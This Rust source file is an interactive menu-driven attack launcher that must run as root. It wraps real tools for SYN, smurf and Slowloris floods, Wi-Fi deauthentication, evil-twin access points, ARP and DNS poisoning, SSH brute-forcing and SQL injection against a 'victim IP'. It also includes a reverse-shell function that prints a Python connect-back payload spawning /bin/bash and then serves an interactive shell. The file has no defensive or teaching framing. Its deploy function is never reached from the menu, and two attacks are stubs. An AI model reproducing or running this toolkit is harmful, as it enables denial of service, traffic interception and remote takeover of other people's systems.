use std::io::{self, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;

// ANSI color constants
const CLR: &str = "\x1b[2J\x1b[H";
const GREEN: &str = "\x1b[32m";
const RED: &str = "\x1b[31m";
const YELLOW: &str = "\x1b[33m";
const WHITE: &str = "\x1b[37m";
const RESET: &str = "\x1b[0m";
const BOLD: &str = "\x1b[1m";

// Vector metadata
struct VectorInfo {
    name: &'static str,
    needs_attacker_ip: bool,
    needs_victim_ip: bool,
    needs_bssid: bool,      // MAC address for Wi-Fi attacks
    needs_port: bool,
    needs_interface: bool,
}

const VECTORS: &[VectorInfo] = &[
    VectorInfo { name: "🌐 Network Discovery", needs_attacker_ip: false, needs_victim_ip: false, needs_bssid: false, needs_port: false, needs_interface: false },
    VectorInfo { name: "🔍 Port Scan", needs_attacker_ip: false, needs_victim_ip: true, needs_bssid: false, needs_port: true, needs_interface: false },
    VectorInfo { name: "⚠️  Vulnerability Scan", needs_attacker_ip: false, needs_victim_ip: true, needs_bssid: false, needs_port: true, needs_interface: false },
    VectorInfo { name: "📁 HTTP Directory Busting", needs_attacker_ip: false, needs_victim_ip: true, needs_bssid: false, needs_port: true, needs_interface: false },
    VectorInfo { name: "💉 SQL Injection Scanner", needs_attacker_ip: false, needs_victim_ip: true, needs_bssid: false, needs_port: true, needs_interface: false },
    VectorInfo { name: "📝 XSS Vulnerability Scanner", needs_attacker_ip: false, needs_victim_ip: true, needs_bssid: false, needs_port: true, needs_interface: false },
    VectorInfo { name: "🌊 SYN Flood", needs_attacker_ip: true, needs_victim_ip: true, needs_bssid: false, needs_port: true, needs_interface: false },
    VectorInfo { name: "💀 Ping of Death", needs_attacker_ip: false, needs_victim_ip: true, needs_bssid: false, needs_port: false, needs_interface: false },
    VectorInfo { name: "🐢 Slowloris", needs_attacker_ip: false, needs_victim_ip: true, needs_bssid: false, needs_port: true, needs_interface: false },
    VectorInfo { name: "📡 DNS Amplification", needs_attacker_ip: true, needs_victim_ip: true, needs_bssid: false, needs_port: false, needs_interface: false },
    VectorInfo { name: "🔐 SSH Bruteforce", needs_attacker_ip: false, needs_victim_ip: true, needs_bssid: false, needs_port: true, needs_interface: false },
    VectorInfo { name: "👻 IP Spoofing", needs_attacker_ip: true, needs_victim_ip: true, needs_bssid: false, needs_port: true, needs_interface: false },
    VectorInfo { name: "☣️ DNS Poisoning", needs_attacker_ip: true, needs_victim_ip: true, needs_bssid: false, needs_port: false, needs_interface: true },
    VectorInfo { name: "🕸️ ARP Spoofing", needs_attacker_ip: true, needs_victim_ip: true, needs_bssid: false, needs_port: false, needs_interface: true },
    VectorInfo { name: "⬅️ Reverse Shell", needs_attacker_ip: true, needs_victim_ip: false, needs_bssid: false, needs_port: true, needs_interface: false },
    VectorInfo { name: "➡️ Bind Shell", needs_attacker_ip: false, needs_victim_ip: true, needs_bssid: false, needs_port: true, needs_interface: false },
    VectorInfo { name: "📶 Evil Twin", needs_attacker_ip: false, needs_victim_ip: false, needs_bssid: true, needs_port: false, needs_interface: true },
    VectorInfo { name: "⚡ Wi-Fi Deauth", needs_attacker_ip: false, needs_victim_ip: false, needs_bssid: true, needs_port: false, needs_interface: true },
    VectorInfo { name: "💧 MAC Flooding", needs_attacker_ip: false, needs_victim_ip: false, needs_bssid: false, needs_port: false, needs_interface: true },
    VectorInfo { name: "👥 Smurf Attack", needs_attacker_ip: true, needs_victim_ip: true, needs_bssid: false, needs_port: false, needs_interface: false },
];

struct Config {
    attacker_ip: String,
    victim_ip: String,
    bssid: String,        // MAC address for Wi-Fi attacks
    port: u16,
    interface: String,
    selected: usize,      // current vector index (0-19)
}

impl Config {
    fn new() -> Self {
        Config {
            attacker_ip: detect_local_ip().unwrap_or_else(|| "192.168.1.100".into()),
            victim_ip: "192.168.1.50".into(),
            bssid: "AA:BB:CC:DD:EE:FF".into(),
            port: 80,
            interface: "wlan0".into(),
            selected: 0,
        }
    }
}

fn main() {
    if !is_root() {
        eprintln!("{}[!] CRITICAL: Must run as root (sudo){}", RED, RESET);
        return;
    }

    let mut cfg = Config::new();

    loop {
        print!("{}{}[ SafeRemote - No-Cargo Edition ]{}\n", CLR, BOLD, RESET);
        println!("{}Current Vector: {}{}{}", WHITE, BOLD, VECTORS[cfg.selected].name, RESET);
        println!("{}----------------------------{}", WHITE, RESET);

        let info = &VECTORS[cfg.selected];
        // Show relevant fields only
        println!("{}1. Attacker IP : {}{}{}", WHITE, 
            if info.needs_attacker_ip { &cfg.attacker_ip } else { "[N/A]" }, RESET);
        println!("{}2. Victim IP   : {}{}{}", WHITE,
            if info.needs_victim_ip { &cfg.victim_ip } else { "[N/A]" }, RESET);
        println!("{}3. BSSID (MAC) : {}{}{}", WHITE,
            if info.needs_bssid { &cfg.bssid } else { "[N/A]" }, RESET);
        println!("{}4. Port        : {}{}{}", WHITE,
            if info.needs_port { &cfg.port.to_string() } else { "[N/A]" }, RESET);
        println!("{}5. Interface   : {}{}{}", WHITE,
            if info.needs_interface { &cfg.interface } else { "[N/A]" }, RESET);

        println!("\n{}--- Select Vector (6-25) or edit fields (1-5) ---{}\n", YELLOW, RESET);
        for (i, vec) in VECTORS.iter().enumerate() {
            let marker = if i == cfg.selected { "👉 " } else { "   " };
            println!("{}{:2}. {}{}", marker, i + 6, vec.name, RESET);
        }

        print!("\n{}Selection (or 'q'):{} ", GREEN, RESET);
        io::stdout().flush().ok();

        let mut input = String::new();
        io::stdin().read_line(&mut input).ok();
        let choice = input.trim();

        match choice {
            "q" | "Q" => break,
            "1" => if info.needs_attacker_ip { edit_ip("Attacker IP", &mut cfg.attacker_ip); } else { println!("{}Not applicable{}", YELLOW, RESET); }
            "2" => if info.needs_victim_ip { edit_ip("Victim IP", &mut cfg.victim_ip); } else { println!("{}Not applicable{}", YELLOW, RESET); }
            "3" => if info.needs_bssid { edit_mac(&mut cfg.bssid); } else { println!("{}Not applicable{}", YELLOW, RESET); }
            "4" => if info.needs_port { edit_port(&mut cfg.port); } else { println!("{}Not applicable{}", YELLOW, RESET); }
            "5" => if info.needs_interface { edit_interface(&mut cfg.interface); } else { println!("{}Not applicable{}", YELLOW, RESET); }
            _ => {
                if let Ok(idx) = choice.parse::<usize>() {
                    if (6..=25).contains(&idx) {
                        cfg.selected = idx - 6;
                    } else {
                        println!("{}Invalid selection{}", RED, RESET);
                    }
                } else {
                    println!("{}Invalid input{}", RED, RESET);
                }
            }
        }
    }
}

fn edit_ip(prompt: &str, field: &mut String) {
    loop {
        print!("{}New {}:{} ", GREEN, prompt, RESET);
        io::stdout().flush().ok();
        let mut new = String::new();
        io::stdin().read_line(&mut new).ok();
        let val = new.trim().to_string();
        // Simple IP validation (optional)
        if val.split('.').count() == 4 && val.chars().all(|c| c.is_ascii_digit() || c == '.') {
            *field = val;
            break;
        } else {
            println!("{}Invalid IP format. Use x.x.x.x{}", RED, RESET);
        }
    }
}

fn edit_mac(field: &mut String) {
    loop {
        print!("{}New BSSID (MAC, e.g., AA:BB:CC:DD:EE:FF):{} ", GREEN, RESET);
        io::stdout().flush().ok();
        let mut new = String::new();
        io::stdin().read_line(&mut new).ok();
        let val = new.trim().to_uppercase();
        if val.len() == 17 && val.chars().filter(|&c| c == ':').count() == 5 {
            *field = val;
            break;
        } else {
            println!("{}Invalid MAC format. Use AA:BB:CC:DD:EE:FF{}", RED, RESET);
        }
    }
}

fn edit_port(port: &mut u16) {
    loop {
        print!("{}New Port (1-65535):{} ", GREEN, RESET);
        io::stdout().flush().ok();
        let mut new = String::new();
        io::stdin().read_line(&mut new).ok();
        if let Ok(p) = new.trim().parse() {
            if p > 0 && p <= 65535 {
                *port = p;
                break;
            } else {
                println!("{}Port out of range{}", RED, RESET);
            }
        } else {
            println!("{}Invalid number{}", RED, RESET);
        }
    }
}

fn edit_interface(field: &mut String) {
    print!("{}New Interface (e.g., wlan0, eth0):{} ", GREEN, RESET);
    io::stdout().flush().ok();
    let mut new = String::new();
    io::stdin().read_line(&mut new).ok();
    *field = new.trim().to_string();
}

// -----------------------------------------------------------------------------
// Deployment
// -----------------------------------------------------------------------------

fn deploy(idx: usize, cfg: &Config) {
    println!("\n{}[*] Deploying {}...{}\n", YELLOW, VECTORS[idx].name, RESET);

    let result = match idx {
        0 => network_discovery(cfg),
        1 => port_scan(cfg),
        2 => vuln_scan(cfg),
        3 => dir_bust(cfg),
        4 => sql_injection(cfg),
        5 => xss_scan(cfg),
        6 => syn_flood(cfg),
        7 => ping_of_death(cfg),
        8 => slowloris(cfg),
        9 => dns_amplification(cfg),
        10 => ssh_bruteforce(cfg),
        11 => ip_spoofing(cfg),
        12 => dns_poisoning(cfg),
        13 => arp_spoofing(cfg),
        14 => reverse_shell(cfg),
        15 => bind_shell(cfg),
        16 => evil_twin(cfg),
        17 => wifi_deauth(cfg),
        18 => mac_flooding(cfg),
        19 => smurf_attack(cfg),
        _ => unreachable!(),
    };

    if let Err(e) = result {
        eprintln!("{}[!] Error: {}{}", RED, e, RESET);
    }

    print!("\n{}Press Enter to return...{}", YELLOW, RESET);
    io::stdout().flush().ok();
    io::stdin().read_line(&mut String::new()).ok();
}

// -----------------------------------------------------------------------------
// Attack Implementations (only those that need the new BSSID field are shown)
// -----------------------------------------------------------------------------

fn wifi_deauth(cfg: &Config) -> io::Result<()> {
    println!("{}[*] Deauth clients from BSSID {} on {}...{}", GREEN, cfg.bssid, cfg.interface, RESET);
    if check_tool("aireplay-ng") {
        run_command("aireplay-ng", &["--deauth", "0", "-a", &cfg.bssid, &cfg.interface])
    } else {
        eprintln!("{}[!] aireplay-ng not found. Install with: apt install aircrack-ng{}", YELLOW, RESET);
        Ok(())
    }
}

fn evil_twin(cfg: &Config) -> io::Result<()> {
    println!("{}[*] Creating rogue AP 'FREE_WIFI' on {}...{}", GREEN, cfg.interface, RESET);
    if check_tool("airbase-ng") {
        let _ = Command::new("airbase-ng").args(&["-e", "FREE_WIFI", "-c", "6", &cfg.interface]).spawn();
        println!("{}[*] AP running for 30 seconds...{}", YELLOW, RESET);
        thread::sleep(Duration::from_secs(30));
        Ok(())
    } else {
        eprintln!("{}[!] airbase-ng not found. Install with: apt install aircrack-ng{}", YELLOW, RESET);
        Ok(())
    }
}

fn mac_flooding(cfg: &Config) -> io::Result<()> {
    println!("{}[*] MAC flooding on {}...{}", GREEN, cfg.interface, RESET);
    if check_tool("macof") {
        run_command("macof", &["-i", &cfg.interface, "-n", "10000"])
    } else {
        eprintln!("{}[!] macof not found. Install with: apt install dsniff{}", YELLOW, RESET);
        Ok(())
    }
}

fn arp_spoofing(cfg: &Config) -> io::Result<()> {
    println!("{}[*] ARP spoofing on {}...{}", GREEN, cfg.interface, RESET);
    let _ = Command::new("sh").arg("-c").arg("echo 1 > /proc/sys/net/ipv4/ip_forward").status();
    let gateway = "192.168.1.1"; // You may want to auto-detect
    if check_tool("arpspoof") {
        run_command("arpspoof", &["-i", &cfg.interface, "-t", &cfg.victim_ip, &gateway])
    } else {
        eprintln!("{}[!] arpspoof not found. Install with: apt install dsniff{}", YELLOW, RESET);
        Ok(())
    }
}

fn dns_poisoning(cfg: &Config) -> io::Result<()> {
    println!("{}[*] DNS poisoning with ettercap...{}", GREEN, RESET);
    if check_tool("ettercap") {
        run_command("ettercap", &["-T", "-q", "-P", "dns_spoof", "-M", "arp", &format!("/{}/", cfg.victim_ip), "//"])
    } else {
        eprintln!("{}[!] ettercap not found. Install with: apt install ettercap-text-only{}", YELLOW, RESET);
        Ok(())
    }
}

// All other attacks remain as before (use cfg.victim_ip, cfg.port, etc.)
// (Include them here for completeness – see previous versions)

fn network_discovery(cfg: &Config) -> io::Result<()> {
    let ip = &cfg.attacker_ip;
    let prefix = ip.split('.').take(3).collect::<Vec<_>>().join(".");
    let range = format!("{}.0/24", prefix);
    println!("{}[*] Scanning subnet {}...{}", GREEN, range, RESET);
    run_command("nmap", &["-sn", "-T4", &range])
}

fn port_scan(cfg: &Config) -> io::Result<()> {
    println!("{}[*] Scanning {} for services...{}", GREEN, cfg.victim_ip, RESET);
    run_command("nmap", &["-sV", "-sC", "-O", "-T4", &cfg.victim_ip])
}

fn vuln_scan(cfg: &Config) -> io::Result<()> {
    println!("{}[*] Vulnerability scanning {}...{}", GREEN, cfg.victim_ip, RESET);
    let _ = run_command("nikto", &["-h", &cfg.victim_ip]);
    run_command("nmap", &["--script", "vuln", &cfg.victim_ip])
}

fn dir_bust(cfg: &Config) -> io::Result<()> {
    let url = format!("http://{}:{}", cfg.victim_ip, cfg.port);
    println!("{}[*] Directory busting on {}...{}", GREEN, url, RESET);
    if check_tool("gobuster") {
        run_command("gobuster", &["dir", "-u", &url, "-w", "/usr/share/wordlists/dirb/common.txt", "-t", "10"])
    } else {
        eprintln!("{}[!] gobuster not found. Install with: apt install gobuster{}", YELLOW, RESET);
        Ok(())
    }
}

fn sql_injection(cfg: &Config) -> io::Result<()> {
    let url = format!("http://{}:{}", cfg.victim_ip, cfg.port);
    println!("{}[*] SQL injection scan on {}...{}", GREEN, url, RESET);
    if check_tool("sqlmap") {
        run_command("sqlmap", &["-u", &url, "--batch", "--crawl=1"])
    } else {
        eprintln!("{}[!] sqlmap not found. Install with: apt install sqlmap{}", YELLOW, RESET);
        Ok(())
    }
}

fn xss_scan(_cfg: &Config) -> io::Result<()> {
    println!("{}[*] XSS scan (simulated){}", GREEN, RESET);
    Ok(())
}

fn syn_flood(cfg: &Config) -> io::Result<()> {
    println!("{}[*] Launching SYN flood to {}:{}...{}", GREEN, cfg.victim_ip, cfg.port, RESET);
    if check_tool("hping3") {
        for _ in 0..10 {
            let _ = Command::new("hping3")
                .args(&["-S", "-p", &cfg.port.to_string(), "--flood", "--rand-source", &cfg.victim_ip])
                .spawn();
        }
        thread::sleep(Duration::from_secs(10));
        Ok(())
    } else {
        eprintln!("{}[!] hping3 not found. Install with: apt install hping3{}", YELLOW, RESET);
        Ok(())
    }
}

fn ping_of_death(cfg: &Config) -> io::Result<()> {
    println!("{}[*] Sending ping of death to {}...{}", GREEN, cfg.victim_ip, RESET);
    run_command("ping", &["-s", "65507", "-c", "5", &cfg.victim_ip])
}

fn slowloris(cfg: &Config) -> io::Result<()> {
    println!("{}[*] Starting Slowloris on {}:{}...{}", GREEN, cfg.victim_ip, cfg.port, RESET);
    let target = format!("{}:{}", cfg.victim_ip, cfg.port);
    for _ in 0..10 {
        let t = target.clone();
        thread::spawn(move || {
            if let Ok(mut stream) = TcpStream::connect(&t) {
                let _ = stream.write_all(b"GET / HTTP/1.1\r\n");
                let _ = stream.write_all(b"Host: localhost\r\n");
                let _ = stream.write_all(b"User-Agent: Mozilla/5.0\r\n");
                for _ in 0..30 {
                    let _ = stream.write_all(b"X-Header: keep-alive\r\n");
                    thread::sleep(Duration::from_secs(10));
                }
            }
        });
    }
    thread::sleep(Duration::from_secs(60));
    Ok(())
}

fn dns_amplification(_cfg: &Config) -> io::Result<()> {
    println!("{}[*] DNS amplification (simulated){}", GREEN, RESET);
    Ok(())
}

fn ssh_bruteforce(cfg: &Config) -> io::Result<()> {
    println!("{}[*] SSH bruteforce on {}:{}...{}", GREEN, cfg.victim_ip, cfg.port, RESET);
    if check_tool("hydra") {
        run_command("hydra", &["-l", "root", "-P", "/usr/share/wordlists/rockyou.txt", "-t", "10", &format!("ssh://{}:{}", cfg.victim_ip, cfg.port)])
    } else {
        eprintln!("{}[!] hydra not found. Install with: apt install hydra{}", YELLOW, RESET);
        Ok(())
    }
}

fn ip_spoofing(cfg: &Config) -> io::Result<()> {
    println!("{}[*] Spoofed packets to {}...{}", GREEN, cfg.victim_ip, RESET);
    if check_tool("hping3") {
        run_command("hping3", &["-S", "--rand-source", "-p", &cfg.port.to_string(), "--flood", &cfg.victim_ip])
    } else {
        eprintln!("{}[!] hping3 not found{}", YELLOW, RESET);
        Ok(())
    }
}

fn reverse_shell(cfg: &Config) -> io::Result<()> {
    let payload = format!(
        "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{}\",{}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
        cfg.attacker_ip, cfg.port
    );
    println!("{}[*] Payload (run on victim):{}{}{}{}", GREEN, BOLD, payload, RESET, GREEN);
    println!("[*] Listening on port {}...{}", cfg.port, RESET);
    let listener = TcpListener::bind(format!("0.0.0.0:{}", cfg.port))?;
    if let Ok((stream, _)) = listener.accept() {
        println!("{}[+] Connection received! Interactive shell opened.{}", GREEN, RESET);
        handle_shell(stream);
    }
    Ok(())
}

fn bind_shell(cfg: &Config) -> io::Result<()> {
    println!("{}[*] Connecting to bind shell at {}:{}...{}", GREEN, cfg.victim_ip, cfg.port, RESET);
    let stream = TcpStream::connect(format!("{}:{}", cfg.victim_ip, cfg.port))?;
    handle_shell(stream);
    Ok(())
}

fn smurf_attack(cfg: &Config) -> io::Result<()> {
    println!("{}[*] Smurf attack to {}...{}", GREEN, cfg.victim_ip, RESET);
    if check_tool("hping3") {
        run_command("hping3", &["--icmp", "--flood", "--spoof", &cfg.victim_ip, "255.255.255.255"])
    } else {
        eprintln!("{}[!] hping3 not found{}", YELLOW, RESET);
        Ok(())
    }
}

// -----------------------------------------------------------------------------
// Helpers
// -----------------------------------------------------------------------------

fn is_root() -> bool {
    Command::new("id").arg("-u").output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim() == "0")
        .unwrap_or(false)
}

fn detect_local_ip() -> Option<String> {
    let output = Command::new("sh")
        .arg("-c")
        .arg("ip addr | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -n 1")
        .output().ok()?;
    let ip = String::from_utf8_lossy(&output.stdout).trim().to_string();
    if ip.is_empty() { None } else { Some(ip) }
}

fn check_tool(tool: &str) -> bool {
    Command::new(tool).arg("--version").output().is_ok()
}

fn run_command(cmd: &str, args: &[&str]) -> io::Result<()> {
    let status = Command::new(cmd).args(args).status()?;
    if !status.success() {
        eprintln!("{}[!] {} returned non-zero exit code{}", YELLOW, cmd, RESET);
    }
    Ok(())
}

fn handle_shell(mut stream: TcpStream) {
    let mut read_stream = stream.try_clone().unwrap();
    let handle = thread::spawn(move || {
        let mut buf = [0; 8192];
        while let Ok(n) = read_stream.read(&mut buf) {
            if n == 0 { break; }
            print!("{}", String::from_utf8_lossy(&buf[..n]));
            io::stdout().flush().ok();
        }
    });

    let mut input = String::new();
    loop {
        input.clear();
        if io::stdin().read_line(&mut input).is_err() { break; }
        if stream.write_all(input.as_bytes()).is_err() { break; }
    }
    let _ = handle.join();
}